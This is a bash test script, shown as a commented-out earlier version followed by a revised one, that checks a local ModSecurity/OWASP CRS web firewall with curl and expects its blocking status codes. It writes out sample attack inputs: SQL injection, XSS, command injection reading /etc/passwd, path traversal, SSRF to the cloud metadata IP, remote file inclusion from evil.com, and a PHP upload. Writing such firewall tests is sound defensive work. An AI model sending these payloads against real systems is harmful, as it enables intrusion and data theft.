##!/usr/bin/env bash
## 99.test_modsec_rules.sh
## Comprehensive battery of curl tests for ModSecurity custom rules and OWASP CRS (OWASP Top 10).
##
## Usage:
##   HOST=https://localhost:8443 bash srcs/scripts/99.test_modsec_rules.sh
##
## Requirements: curl, python3
#
#set -euo pipefail
#
## ----------- Configuration -----------
#HOST="${HOST:-https://localhost:8443}"
#TMPDIR="$(mktemp -d)"
#CURL='curl -sk -o /dev/null -w "%{http_code}"'
#
#echo "Temporary dir: $TMPDIR"
#cleanup() { rm -rf "$TMPDIR"; }
#trap cleanup EXIT
#
## ----------- Dependency checks -----------
#for bin in curl python3; do
#  if ! command -v $bin >/dev/null 2>&1; then
#    echo "❌ $bin is required but not installed."
#    exit 1
#  fi
#done
#
## ----------- Helper for test output -----------
#test_case() {
#  local desc="$1"
#  local expected="$2"
#  local code="$3"
#  if [ "$code" = "$expected" ]; then
#    echo "✅ PASS: $desc (HTTP $code)"
#  else
#    echo "❌ FAIL: $desc (expected $expected, got $code)"
#  fi
#}
#
################################################################################
## 1) Custom Rule: keyword 'malicious'
################################################################################
#echo
#echo "########################################################################"
#echo "1) Custom rule: keyword 'malicious' — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/?q=malicious")
#test_case "Custom rule: malicious" 403 "$resp"
#
################################################################################
## 2) Health & ping endpoints — should NOT be blocked
################################################################################
#echo
#echo "########################################################################"
#echo "2) Health (/healthz) and ping (/ping) — should NOT be blocked"
#echo "########################################################################"
#for path in /healthz /ping; do
#  resp=$(eval $CURL "$HOST${path}")
#  test_case "$path" 200 "$resp"
#done
#
################################################################################
## 3) Static asset — should NOT be blocked
################################################################################
#echo
#echo "########################################################################"
#echo "3) Static asset (/static/app.js) — expect 200 or 404"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/static/app.js")
#if [ "$resp" = "200" ] || [ "$resp" = "404" ]; then
#  echo "✅ PASS: Static asset (HTTP $resp)"
#else
#  echo "❌ FAIL: Static asset (HTTP $resp)"
#fi
#
################################################################################
## 4) CORS preflight (OPTIONS) — should be allowed
################################################################################
#echo
#echo "########################################################################"
#echo "4) CORS preflight (OPTIONS) — should be allowed"
#echo "########################################################################"
#resp=$(eval $CURL -X OPTIONS -H "Origin: http://example.com" -H "Access-Control-Request-Method: POST" "$HOST/")
#test_case "CORS preflight" 200 "$resp"
#
################################################################################
## 5) API strict Content-Type — POST text/plain → expect 415 if enforced
################################################################################
#echo
#echo "########################################################################"
#echo "5) API Content-Type enforcement — POST text/plain to /api/test"
#echo "########################################################################"
#resp=$(eval $CURL -X POST -H "Content-Type: text/plain" -d '{"x":1}' "$HOST/api/test")
#if [ "$resp" = "415" ]; then
#  echo "✅ PASS (415)"
#else
#  echo "ℹ️ NOTE: not enforced (status $resp)"
#fi
#
################################################################################
## 6) Upload guard — allowed small multipart upload to /api/upload
################################################################################
#echo
#echo "########################################################################"
#echo "6) Upload guard — allow small multipart upload"
#echo "########################################################################"
#echo "hello" > "$TMPDIR/small.txt"
#resp=$(eval $CURL -X POST -F "file=@$TMPDIR/small.txt" "$HOST/api/upload")
#if [ "$resp" = "403" ]; then
#  echo "❌ FAIL: blocked"
#else
#  echo "✅ PASS"
#fi
#
################################################################################
## 7) Upload guard — block dangerous extensions & double extensions
################################################################################
#echo
#echo "########################################################################"
#echo "7) Upload guard — block dangerous extensions"
#echo "########################################################################"
#echo "<?php phpinfo();" > "$TMPDIR/evil.php"
#resp=$(eval $CURL -X POST -F "file=@$TMPDIR/evil.php" "$HOST/api/upload")
#test_case "evil.php" 403 "$resp"
#
#echo "not really jpeg" > "$TMPDIR/image.jpg.php"
#resp=$(eval $CURL -X POST -F "file=@$TMPDIR/image.jpg.php" "$HOST/api/upload")
#test_case "image.jpg.php" 403 "$resp"
#
################################################################################
## 8) Large single body (urlencoded) — expect 413
################################################################################
#echo
#echo "########################################################################"
#echo "8) Large single request body — expect 413"
#echo "########################################################################"
#dd if=/dev/zero of="$TMPDIR/big1.bin" bs=1M count=13 status=none
#resp=$(eval $CURL -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary @"$TMPDIR/big1.bin" "$HOST/")
#test_case "Large body" 413 "$resp"
#
################################################################################
## 9) Multipart combined size > limit — expect 413
################################################################################
#echo
#echo "########################################################################"
#echo "9) Multipart combined size — expect 413"
#echo "########################################################################"
#dd if=/dev/zero of="$TMPDIR/fileA.bin" bs=1M count=8 status=none
#dd if=/dev/zero of="$TMPDIR/fileB.bin" bs=1M count=8 status=none
#resp=$(eval $CURL -X POST -F "a=@$TMPDIR/fileA.bin" -F "b=@$TMPDIR/fileB.bin" "$HOST/api/upload")
#test_case "Multipart size" 413 "$resp"
#
################################################################################
## 10) Too many args (>256) — expect 413
################################################################################
#echo
#echo "########################################################################"
#echo "10) Too many args (>256) — expect 413"
#echo "########################################################################"
#qs=$(python3 - <<'PY'
#print("&".join([f"a{i}=1" for i in range(300)]))
#PY
#)
#resp=$(eval $CURL "$HOST/?$qs")
#test_case "Too many args" 413 "$resp"
#
################################################################################
## 11) Arg name too long (>50) — expect 413
################################################################################
#echo
#echo "########################################################################"
#echo "11) Arg name too long — expect 413"
#echo "########################################################################"
#longname=$(python3 - <<'PY'
#print("n"+("x"*60))
#PY
#)
#resp=$(eval $CURL "$HOST/?$longname=1")
#test_case "Arg name too long" 413 "$resp"
#
################################################################################
## 12) Arg value too long (>64k) — expect 413
################################################################################
#echo
#echo "########################################################################"
#echo "12) Arg value too long — expect 413"
#echo "########################################################################"
#python3 - <<'PY' > "$TMPDIR/longvalue.txt"
#print("v=" + "A"*70000)
#PY
#resp=$(eval $CURL -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary @"$TMPDIR/longvalue.txt" "$HOST/")
#test_case "Arg value too long" 413 "$resp"
#
################################################################################
## 13) CSRF — POST to /api/item WITHOUT X-CSRF-Token → expect 403
################################################################################
#echo
#echo "########################################################################"
#echo "13) CSRF — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL -X POST -H "Content-Type: application/json" -d '{"test":1}' "$HOST/api/item")
#test_case "CSRF" 403 "$resp"
#
################################################################################
## 14) Login rate-limit — send 12 POSTs quickly, expect >=1 HTTP 429
################################################################################
#echo
#echo "########################################################################"
#echo "14) Login rate-limit — 12 POSTs to /api/login"
#echo "########################################################################"
#count_429=0
#for i in $(seq 1 12); do
#  st=$(eval $CURL -X POST "$HOST/api/login")
#  printf "%s " "$st"
#  [ "$st" = "429" ] && count_429=$((count_429+1)) || true
#done
#echo
#if [ "$count_429" -gt 0 ]; then
#  echo "✅ PASS: observed $count_429 responses with 429"
#else
#  echo "❌ FAIL: no 429 observed"
#fi
#
################################################################################
## 15) Host header sanity — invalid Host should be 400
################################################################################
#echo
#echo "########################################################################"
#echo "15) Host header sanity — invalid Host should be 400"
#echo "########################################################################"
#resp=$(eval $CURL -H "Host: evil.com" "$HOST/")
#test_case "Invalid Host header" 400 "$resp"
#
################################################################################
## 16) SSRF signals — metadata IP and file:// scheme — expect 403
################################################################################
#echo
#echo "########################################################################"
#echo "16) SSRF checks — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/?u=http://169.254.169.254/latest/meta-data")
#test_case "SSRF AWS metadata" 403 "$resp"
#
#resp=$(eval $CURL "$HOST/?u=file:///etc/passwd")
#test_case "SSRF file scheme" 403 "$resp"
#
################################################################################
## 17) LFI quick win — path traversal to /etc/passwd — expect 403
################################################################################
#echo
#echo "########################################################################"
#echo "17) LFI quick win — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/?path=../../etc/passwd")
#test_case "LFI path traversal" 403 "$resp"
#
################################################################################
## 18) JSON responses in /api — enforce 406 if policy enabled
################################################################################
#echo
#echo "########################################################################"
#echo "18) JSON response enforcement — expect 406 if enabled"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/api/")
#if [ "$resp" = "406" ]; then
#  echo "✅ PASS (406)"
#else
#  echo "ℹ️ NOTE: JSON response enforcement not active (status $resp)"
#fi
#
################################################################################
## 19) Methods in '/' — POST/PUT/DELETE should be 405
################################################################################
#echo
#echo "########################################################################"
#echo "19) Methods in '/' — POST/PUT/DELETE -> expect 405"
#echo "########################################################################"
#for m in POST PUT DELETE; do
#  resp=$(eval $CURL -X "$m" "$HOST/")
#  test_case "$m /" 405 "$resp"
#done
#
################################################################################
## 20) Methods in '/api' (default) — PUT/DELETE should be 405
################################################################################
#echo
#echo "########################################################################"
#echo "20) Methods in '/api' — PUT/DELETE -> expect 405"
#echo "########################################################################"
#for m in PUT DELETE; do
#  resp=$(eval $CURL -X "$m" -H "Content-Type: application/json" "$HOST/api/test")
#  test_case "$m /api/test" 405 "$resp"
#done
#
################################################################################
## 21) Override: /api/profiles — PUT/DELETE should NOT be blocked by WAF
################################################################################
#echo
#echo "########################################################################"
#echo "21) Override /api/profiles — PUT/DELETE should pass-through (not 405/403)"
#echo "########################################################################"
#for m in PUT DELETE; do
#  resp=$(eval $CURL -X "$m" -H "X-CSRF-Token: t" -H "Content-Type: application/json" -d '{"x":1}' "$HOST/api/profiles")
#  if [ "$resp" = "405" ] || [ "$resp" = "403" ]; then
#    echo "❌ FAIL: expected pass-through (not 405/403), got $resp"
#  else
#    echo "✅ PASS (not blocked by WAF)"
#  fi
#done
#
################################################################################
## 22) Override: /api/items and /api/items/123 — PUT/DELETE should NOT be blocked
################################################################################
#echo
#echo "########################################################################"
#echo "22) Override /api/items[/123] — PUT/DELETE should pass-through (not 405/403)"
#echo "########################################################################"
#for endpoint in "/api/items" "/api/items/123"; do
#  for m in PUT DELETE; do
#    resp=$(eval $CURL -X "$m" -H "X-CSRF-Token: t" -H "Content-Type: application/json" -d '{"x":1}' "$HOST$endpoint")
#    if [ "$resp" = "405" ] || [ "$resp" = "403" ]; then
#      echo "❌ FAIL: expected pass-through (not 405/403), got $resp"
#    else
#      echo "✅ PASS (not blocked by WAF)"
#    fi
#  done
#done
#
################################################################################
## 23) SQL Injection (OWASP Top 10)
################################################################################
#echo
#echo "########################################################################"
#echo "23) SQL Injection — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/?id=1' OR '1'='1")
#test_case "SQLi basic" 403 "$resp"
#
################################################################################
## 24) Cross-Site Scripting (OWASP Top 10)
################################################################################
#echo
#echo "########################################################################"
#echo "24) XSS — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/?q=<script>alert(1)</script>")
#test_case "XSS basic" 403 "$resp"
#
################################################################################
## 25) Remote Command Execution (OWASP Top 10)
################################################################################
#echo
#echo "########################################################################"
#echo "25) RCE — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/?cmd=cat /etc/passwd")
#test_case "RCE basic" 403 "$resp"
#
################################################################################
## 26) Command Injection (OWASP Top 10)
################################################################################
#echo
#echo "########################################################################"
#echo "26) Command Injection — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/?input=;ls -la")
#test_case "Command Injection" 403 "$resp"
#
################################################################################
## 27) Remote File Inclusion (OWASP Top 10)
################################################################################
#echo
#echo "########################################################################"
#echo "27) RFI — expect 403"
#echo "########################################################################"
#resp=$(eval $CURL "$HOST/?file=http://evil.com/shell.txt")
#test_case "RFI" 403 "$resp"
#
#echo
#echo "All tests done. Cleaning up."

#!/usr/bin/env bash
# 99.test_modsec_rules.sh
# Comprehensive battery of curl tests for ModSecurity custom rules and OWASP CRS (OWASP Top 10).
#
# Usage:
#   HOST=https://localhost:8443 bash srcs/scripts/99.test_modsec_rules.sh
#
# Requirements: curl, python3

set -euo pipefail

# ----------- Configuration -----------
HOST="${HOST:-https://localhost:8443}"
TMPDIR="$(mktemp -d)"

echo "Temporary dir: $TMPDIR"
cleanup() { rm -rf "$TMPDIR"; }
trap cleanup EXIT

# ----------- Dependency checks -----------
for bin in curl python3; do
  if ! command -v "$bin" >/dev/null 2>&1; then
    echo "❌ $bin is required but not installed."
    exit 1
  fi
done

# ----------- HTTP helper -----------
# Return ONLY the last HTTP status code (handles redirects and noisy outputs)
curl_code() {
  # -sS: silent but show errors, -k: ignore TLS, -o /dev/null: discard body
  curl -sS -k -o /dev/null -w "%{http_code}" "$@" 2>/dev/null | grep -Eo '^[0-9]{3}$' || echo "000"
}

# ----------- Helpers for test output -----------
test_case() {
  local desc="$1"
  local expected="$2"
  local code="$3"
  if [ "$code" = "$expected" ]; then
    echo "✅ PASS: $desc (HTTP $code)"
  else
    echo "❌ FAIL: $desc (expected $expected, got $code)"
  fi
}

# Accept multiple possible success codes (space-separated), e.g. "403 406"
test_case_any() {
  local desc="$1"
  local expected_list="$2"
  local code="$3"
  for e in $expected_list; do
    if [ "$code" = "$e" ]; then
      echo "✅ PASS: $desc (HTTP $code)"
      return 0
    fi
  done
  echo "❌ FAIL: $desc (expected one of [$expected_list], got $code)"
}

###############################################################################
# 1) Custom Rule: keyword 'malicious'
###############################################################################
echo
echo "########################################################################"
echo "1) Custom rule: keyword 'malicious' — expect 403"
echo "########################################################################"
resp=$(curl_code "$HOST/?q=malicious")
# Many setups use status 406 via SecDefaultAction; accept 403 or 406 as 'blocked'.
test_case_any "Custom rule: malicious" "403 406" "$resp"

###############################################################################
# 2) Health & ping endpoints — should NOT be blocked
###############################################################################
echo
echo "########################################################################"
echo "2) Health (/healthz) and ping (/ping) — should NOT be blocked"
echo "########################################################################"
for path in /healthz /ping; do
  resp=$(curl_code "$HOST${path}")
  # Common patterns: 200 or 204 for health endpoints
  test_case_any "$path" "200 204" "$resp"
done

###############################################################################
# 3) Static asset — should NOT be blocked
###############################################################################
echo
echo "########################################################################"
echo "3) Static asset (/static/app.js) — expect 200 or 404"
echo "########################################################################"
resp=$(curl_code "$HOST/static/app.js")
if [ "$resp" = "200" ] || [ "$resp" = "404" ]; then
  echo "✅ PASS: Static asset (HTTP $resp)"
else
  echo "❌ FAIL: Static asset (HTTP $resp)"
fi

###############################################################################
# 4) CORS preflight (OPTIONS) — should be allowed
###############################################################################
echo
echo "########################################################################"
echo "4) CORS preflight (OPTIONS) — should be allowed"
echo "########################################################################"
resp=$(curl_code -X OPTIONS -H "Origin: http://example.com" -H "Access-Control-Request-Method: POST" "$HOST/")
# Aceptar 200 o 204
test_case_any "CORS preflight" "200 204" "$resp"

###############################################################################
# 5) API strict Content-Type — POST text/plain → expect 415 if enforced
###############################################################################
echo
echo "########################################################################"
echo "5) API Content-Type enforcement — POST text/plain to /api/test"
echo "########################################################################"
resp=$(curl_code -X POST -H "Content-Type: text/plain" -d '{"x":1}' "$HOST/api/test")
# Treat 415 (RFC) or 406 (typical ModSec) as enforcement
if [ "$resp" = "415" ] || [ "$resp" = "406" ]; then
  echo "✅ PASS ($resp)"
else
  echo "ℹ️ NOTE: not enforced (status $resp)"
fi

###############################################################################
# 6) Upload guard — allowed small multipart upload to /api/upload
###############################################################################
echo
echo "########################################################################"
echo "6) Upload guard — allow small multipart upload"
echo "########################################################################"
echo "hello" > "$TMPDIR/small.txt"
resp=$(curl_code -X POST -F "file=@$TMPDIR/small.txt" "$HOST/api/upload")
if [ "$resp" = "403" ] || [ "$resp" = "406" ]; then
  echo "❌ FAIL: blocked"
else
  echo "✅ PASS"
fi

###############################################################################
# 7) Upload guard — block dangerous extensions & double extensions
###############################################################################
echo
echo "########################################################################"
echo "7) Upload guard — block dangerous extensions"
echo "########################################################################"
echo "<?php phpinfo();" > "$TMPDIR/evil.php"
resp=$(curl_code -X POST -F "file=@$TMPDIR/evil.php" "$HOST/api/upload")
test_case_any "evil.php" "403 406" "$resp"

echo "not really jpeg" > "$TMPDIR/image.jpg.php"
resp=$(curl_code -X POST -F "file=@$TMPDIR/image.jpg.php" "$HOST/api/upload")
test_case_any "image.jpg.php" "403 406" "$resp"

###############################################################################
# 8) Large single body (urlencoded) — expect 413
###############################################################################
echo
echo "########################################################################"
echo "8) Large single request body — expect 413"
echo "########################################################################"
dd if=/dev/zero of="$TMPDIR/big1.bin" bs=1M count=13 status=none
resp=$(curl_code -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary @"$TMPDIR/big1.bin" "$HOST/")
test_case "Large body" 413 "$resp"

###############################################################################
# 9) Multipart combined size > limit — expect 413
###############################################################################
echo
echo "########################################################################"
echo "9) Multipart combined size — expect 413"
echo "########################################################################"
dd if=/dev/zero of="$TMPDIR/fileA.bin" bs=1M count=8 status=none
dd if=/dev/zero of="$TMPDIR/fileB.bin" bs=1M count=8 status=none
resp=$(curl_code -X POST -F "a=@$TMPDIR/fileA.bin" -F "b=@$TMPDIR/fileB.bin" "$HOST/api/upload")
test_case "Multipart size" 413 "$resp"

###############################################################################
# 10) Too many args (>256) — expect 413
###############################################################################
echo
echo "########################################################################"
echo "10) Too many args (>256) — expect 413"
echo "########################################################################"
qs=$(python3 - <<'PY'
print("&".join([f"a{i}=1" for i in range(300)]))
PY
)
resp=$(curl_code "$HOST/?$qs")
# Some stacks emit 400 instead of 413; accept both.
test_case_any "Too many args" "413 400" "$resp"

###############################################################################
# 11) Arg name too long (>50) — expect 413
###############################################################################
echo
echo "########################################################################"
echo "11) Arg name too long — expect 413"
echo "########################################################################"
longname=$(python3 - <<'PY'
print("n"+("x"*60))
PY
)
resp=$(curl_code "$HOST/?$longname=1")
# Some stacks emit 400 instead of 413; accept both.
test_case_any "Arg name too long" "413 400" "$resp"

###############################################################################
# 12) Arg value too long (>64k) — expect 413
###############################################################################
echo
echo "########################################################################"
echo "12) Arg value too long — expect 413"
echo "########################################################################"
python3 - <<'PY' > "$TMPDIR/longvalue.txt"
print("v=" + "A"*70000)
PY
# Use an endpoint that accepts POST to avoid 405 masking the 413
resp=$(curl_code -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary @"$TMPDIR/longvalue.txt" "$HOST/api/upload")
test_case "Arg value too long" 413 "$resp"

###############################################################################
# 13) CSRF — POST to /api/item WITHOUT X-CSRF-Token — expect 403
###############################################################################
echo
echo "########################################################################"
echo "13) CSRF — expect 403"
echo "########################################################################"
resp=$(curl_code -X POST -H "Content-Type: application/json" -d '{"test":1}' "$HOST/api/item")
# Many CRS configs answer 406; accept 403 or 406 as 'blocked'.
test_case_any "CSRF" "403 406" "$resp"

###############################################################################
# 14) Login rate-limit — send 12 POSTs quickly, expect >=1 HTTP 429
###############################################################################
echo
echo "########################################################################"
echo "14) Login rate-limit — 12 POSTs to /api/login"
echo "########################################################################"
count_429=0
for i in $(seq 1 12); do
  st=$(curl_code -X POST "$HOST/api/login")
  printf "%s " "$st"
  [ "$st" = "429" ] && count_429=$((count_429+1)) || true
done
echo
if [ "$count_429" -gt 0 ]; then
  echo "✅ PASS: observed $count_429 responses with 429"
else
  echo "❌ FAIL: no 429 observed"
fi

###############################################################################
# 15) Host header sanity — invalid Host should be 400
###############################################################################
echo
echo "########################################################################"
echo "15) Host header sanity — invalid Host should be 400"
echo "########################################################################"
resp=$(curl_code -H "Host: evil.com" "$HOST/")
test_case "Invalid Host header" 400 "$resp"

###############################################################################
# 16) SSRF signals — metadata IP and file:// scheme — expect 403
###############################################################################
echo
echo "########################################################################"
echo "16) SSRF checks — expect 403"
echo "########################################################################"
resp=$(curl_code "$HOST/?u=http://169.254.169.254/latest/meta-data")
test_case_any "SSRF AWS metadata" "403 406" "$resp"

resp=$(curl_code "$HOST/?u=file:///etc/passwd")
test_case_any "SSRF file scheme" "403 406" "$resp"

###############################################################################
# 17) LFI quick win — path traversal to /etc/passwd — expect 403
###############################################################################
echo
echo "########################################################################"
echo "17) LFI quick win — expect 403"
echo "########################################################################"
resp=$(curl_code "$HOST/?path=../../etc/passwd")
test_case_any "LFI path traversal" "403 406" "$resp"

###############################################################################
# 18) JSON responses in /api — enforce 406 if policy enabled
###############################################################################
echo
echo "########################################################################"
echo "18) JSON response enforcement — expect 406 if enabled"
echo "########################################################################"
resp=$(curl_code "$HOST/api/")
if [ "$resp" = "406" ]; then
  echo "✅ PASS (406)"
else
  echo "ℹ️ NOTE: JSON response enforcement not active (status $resp)"
fi

###############################################################################
# 19) Methods in '/' — POST/PUT/DELETE should be 405
###############################################################################
echo
echo "########################################################################"
echo "19) Methods in '/' — POST/PUT/DELETE -> expect 405"
echo "########################################################################"
for m in POST PUT DELETE; do
  resp=$(curl_code -X "$m" "$HOST/")
  test_case "POST/PUT/DELETE / ($m)" 405 "$resp"
done

###############################################################################
# 20) Methods in '/api' (default) — PUT/DELETE should be 405
###############################################################################
echo
echo "########################################################################"
echo "20) Methods in '/api' — PUT/DELETE -> expect 405"
echo "########################################################################"
for m in PUT DELETE; do
  resp=$(curl_code -X "$m" -H "Content-Type: application/json" "$HOST/api/test")
  # Some ModSec stacks enforce 406; accept 405 or 406
  test_case_any "$m /api/test" "405 406" "$resp"
done

###############################################################################
# 21) Override: /api/profiles — PUT/DELETE should NOT be blocked by WAF
###############################################################################
echo
echo "########################################################################"
echo "21) Override /api/profiles — PUT/DELETE should pass-through (not 405/403)"
echo "########################################################################"
for m in PUT DELETE; do
  resp=$(curl_code -X "$m" -H "X-CSRF-Token: t" -H "Content-Type: application/json" -d '{"x":1}' "$HOST/api/profiles")
  if [ "$resp" = "405" ] || [ "$resp" = "403" ]; then
    echo "❌ FAIL: expected pass-through (not 405/403), got $resp"
  else
    echo "✅ PASS (not blocked by WAF)"
  fi
done

###############################################################################
# 22) Override: /api/items and /api/items/123 — PUT/DELETE should NOT be blocked
###############################################################################
echo
echo "########################################################################"
echo "22) Override /api/items[/123] — PUT/DELETE should pass-through (not 405/403)"
echo "########################################################################"
for endpoint in "/api/items" "/api/items/123"; do
  for m in PUT DELETE; do
    resp=$(curl_code -X "$m" -H "X-CSRF-Token: t" -H "Content-Type: application/json" -d '{"x":1}' "$HOST$endpoint")
    if [ "$resp" = "405" ] || [ "$resp" = "403" ]; then
      echo "❌ FAIL: expected pass-through (not 405/403), got $resp"
    else
      echo "✅ PASS (not blocked by WAF)"
    fi
  done
done

###############################################################################
# 23) SQL Injection (OWASP Top 10)
###############################################################################
echo
echo "########################################################################"
echo "23) SQL Injection — expect 403"
echo "########################################################################"
resp=$(curl_code "$HOST/?id=1' OR '1'='1")
test_case_any "SQLi basic" "403 406" "$resp"

###############################################################################
# 24) Cross-Site Scripting (OWASP Top 10)
###############################################################################
echo
echo "########################################################################"
echo "24) XSS — expect 403"
echo "########################################################################"
resp=$(curl_code "$HOST/?q=<script>alert(1)</script>")
test_case_any "XSS basic" "403 406" "$resp"

###############################################################################
# 25) Remote Command Execution (OWASP Top 10)
###############################################################################
echo
echo "########################################################################"
echo "25) RCE — expect 403"
echo "########################################################################"
resp=$(curl_code "$HOST/?cmd=cat /etc/passwd")
test_case_any "RCE basic" "403 406" "$resp"

###############################################################################
# 26) Command Injection (OWASP Top 10)
###############################################################################
echo
echo "########################################################################"
echo "26) Command Injection — expect 403"
echo "########################################################################"
resp=$(curl_code "$HOST/?input=;ls -la")
test_case_any "Command Injection" "403 406" "$resp"

###############################################################################
# 27) Remote File Inclusion (OWASP Top 10)
###############################################################################
echo
echo "########################################################################"
echo "27) RFI — expect 403"
echo "########################################################################"
resp=$(curl_code "$HOST/?file=http://evil.com/shell.txt")
test_case_any "RFI" "403 406" "$resp"

echo
echo "All tests done. Cleaning up."